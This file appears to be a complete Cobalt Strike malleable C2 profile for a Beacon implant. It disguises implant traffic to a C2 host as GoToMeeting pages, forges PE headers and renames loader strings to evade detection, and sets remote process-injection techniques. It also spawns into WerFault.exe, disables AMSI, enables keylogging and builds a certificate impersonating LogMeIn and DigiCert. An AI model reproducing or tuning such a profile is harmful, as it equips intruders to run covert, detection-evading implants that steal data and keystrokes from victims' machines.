set host_stage "false";
set sleeptime "43000";
set jitter    "11";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.0 Safari/537.36 Edg/80.0.361.0";

# Task and Proxy Max Size
set tasks_max_size "1048576";
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";

set data_jitter "50";
set smb_frame_header "";
set pipename "epmapper-7452";
set pipename_stager "epmapper-6972";

set tcp_frame_header "";
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "epmapper-##";

####Manaully add these if your doing C2 over DNS (Future Release)####
##dns-beacon {
#    set dns_idle             "1.2.3.4";
#    set dns_max_txt          "199";
#    set dns_sleep            "1";
#    set dns_ttl              "5";
#    set maxdns               "200";
#    set dns_stager_prepend   "doc-stg-prepend";
#    set dns_stager_subhost   "doc-stg-sh.";

#    set beacon               "doc.bc.";
#    set get_A                "doc.1a.";
#    set get_AAAA             "doc.4a.";
#    set get_TXT              "doc.tx.";
#    set put_metadata         "doc.md.";
#    set put_output           "doc.po.";
#    set ns_response          "zero";

#}



stage {
        set obfuscate "true";
        set stomppe "true";
        set cleanup "true";
        set userwx "false";
        set smartinject "true";


        #TCP and SMB beacons will obfuscate themselves while they wait for a new connection.
        #They will also obfuscate themselves while they wait to read information from their parent Beacon.
        set sleep_mask "true";


        set checksum       "1968945";
        set compile_time   "26 Jul 2021 18:09:30";
        set entry_point    "1099888";
        set image_size_x86 "2072576";
        set image_size_x64 "2072576";
        set name           "InProcessClient.dll";
        set rich_header    "\xd5\x71\x0e\xb3\x91\x10\x60\xe0\x91\x10\x60\xe0\x91\x10\x60\xe0\x85\x7b\x63\xe1\x84\x10\x60\xe0\x85\x7b\x65\xe1\x24\x10\x60\xe0\x48\x64\x64\xe1\x83\x10\x60\xe0\x48\x64\x63\xe1\x9d\x10\x60\xe0\xf7\x7f\x9d\xe0\x92\x10\x60\xe0\x4a\x64\x61\xe1\x93\x10\x60\xe0\x85\x7b\x64\xe1\xb2\x10\x60\xe0\x85\x7b\x61\xe1\x94\x10\x60\xe0\x48\x64\x65\xe1\x0e\x10\x60\xe0\xfb\x78\x65\xe1\x80\x10\x60\xe0\x85\x7b\x66\xe1\x93\x10\x60\xe0\x91\x10\x61\xe0\x5c\x11\x60\xe0\x4a\x64\x69\xe1\x03\x10\x60\xe0\x4a\x64\x63\xe1\x93\x10\x60\xe0\x4a\x64\x60\xe1\x90\x10\x60\xe0\x4a\x64\x9f\xe0\x90\x10\x60\xe0\x91\x10\xf7\xe0\x90\x10\x60\xe0\x4a\x64\x62\xe1\x90\x10\x60\xe0\x52\x69\x63\x68\x91\x10\x60\xe0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    


        transform-x86 {
                prepend "\x90\x90\x90"; # NOP, NOP!
                strrep "ReflectiveLoader" "LoadImagee";
                strrep "This program cannot be run in DOS mode" "Warning";


                }

        transform-x64 {
                prepend "\x90\x90\x90"; # NOP, NOP!
                strrep "ReflectiveLoader" "LoadEventt";
                strrep "This program cannot be run in DOS mode" "help warning";
                strrep "beacon.x64.dll" "bcon.x64.dll";

                strrep "beacon.dll" "bcon.dll";

                }
}


process-inject {
    # set remote memory allocation technique
        set allocator "NtMapViewOfSection";

    # shape the content and properties of what we will inject
    set min_alloc "5690";
    set userwx    "false";
    set startrwx "true";

    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    # specify how we execute code in the remote process
    execute {
                CreateThread "ntdll.dll!RtlUserThreadStart+0x778";
        NtQueueApcThread-s;
        SetThreadContext;
        CreateRemoteThread;
                CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        RtlCreateUserThread;
        }
}

post-ex {
    # control the temporary process we spawn to

        set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";
        set spawnto_x64 "%windir%\\sysnative\\WerFault.exe"; 

    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";
 
    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";
 
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";

        # control the method used to log keystrokes 
        set keylogger "SetWindowsHookEx";
}


http-config {
        set headers "Server, Content-Type, Brightspot-Id, Cache-Control, X-Content-Type-Options, X-Powered-By, Vary, Connection";
        header "Content-Type" "text/html;charset=UTF-8";
        header "Connection" "close";
        header "Brightspot-Id" "00000459-72af-a783-feef2189";
        header "Cache-Control" "max-age=3222002";
        header "Server" "Apache-Coyote/1.1";
        header "X-Content-Type-Options" "nosniff";
        header "X-Powered-By" "Brightspot";
        header "Vary" "Accept-Encoding";
        set trust_x_forwarded_for "false";

}

http-get {

set uri "/functionalStatus/ge7hYGKJjFjO6seFQ0EgVZC4 ";


client {

        header "Host" "10.9.254.6";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";

        metadata {
        base64url; 
        parameter "_";

        }

}

server {

        output {

                base64url;          

        prepend "content=";
        prepend "<meta name=\"google-site-verification\"\n";
        prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
        prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
        prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
        prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
        prepend "        <meta charset=\"UTF-8\">\n";
        prepend "    <head>\n";
        prepend "<html lang=\"en\">\n";
        prepend "<!DOCTYPE html>\n";

        append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
        append "<script type=\"text/javascript\">\n";
        append "  var _kiq = _kiq || [];\n";
        append "  (function(){\n";
        append "    setTimeout(function(){\n";
        append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
        append "d.createElement('script'); s.type = 'text/javascript';\n";
        append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
        append "f.parentNode.insertBefore(s, f);\n";
        append "    }, 1);\n";
        append "})();\n";
        append "</script>\n";
        append "</body>\n";
        append "</html>\n";
                print;
        }
}
}

http-post {

set uri "/rest/2/meetingsnOPylgLs1rg70rWk4FT2Bzilp ";

set verb "GET";

client {

        header "Host" "10.9.254.6";
        header "Accept" "*/*";
        header "Accept-Language" "en";
        header "Connection" "close";     

        output {
                base64url; 
        parameter "includeMeetingsICoorganize";
        }


        id {
                base64url;
        parameter "includeCoorganizers";

        }
}

server {

        output {
                base64url;          

        prepend "content=";
        prepend "<meta name=\"google-site-verification\"\n";
        prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
        prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
        prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
        prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
        prepend "        <meta charset=\"UTF-8\">\n";
        prepend "    <head>\n";
        prepend "<html lang=\"en\">\n";
        prepend "<!DOCTYPE html>\n";

        append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
        append "<script type=\"text/javascript\">\n";
        append "  var _kiq = _kiq || [];\n";
        append "  (function(){\n";
        append "    setTimeout(function(){\n";
        append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
        append "d.createElement('script'); s.type = 'text/javascript';\n";
        append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
        append "f.parentNode.insertBefore(s, f);\n";
        append "    }, 1);\n";
        append "})();\n";
        append "</script>\n";
        append "</body>\n";
        append "</html>\n";
                print;
        }
}
}

http-stager {

set uri_x86 "/Meeting/Kqp9Nihb/";
set uri_x64 "/Meeting/Kqp9Nihb/";

client {
        header "Host" "10.9.254.6";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";
}

server {

}


}

https-certificate {set CN "10.9.254.6"; #Common Name
set O        "LogMeIn Inc."; #Organization Name
set C        "US"; #Country
set L        "Boston"; #Locality
set OU       "DigiCert Inc"; #Organizational Unit Name
set ST       "Massachusetts"; #State or Province
set validity "365"; #Number of days the cert is valid for
}
